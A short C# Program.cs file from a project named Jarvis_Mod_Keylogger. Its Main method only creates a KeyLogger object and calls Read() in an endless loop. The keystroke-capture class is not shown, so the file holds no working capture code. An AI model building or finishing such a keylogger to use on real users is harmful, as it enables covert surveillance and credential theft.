using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO.Log;

namespace Jarvis_Mod_Keylogger
{
    class Program
    {
        static void Main(string[] args)
        {
            KeyLogger Key = new KeyLogger();
            while(true)
                {
                Key.Read();
                
            }

            
        }

    }
}

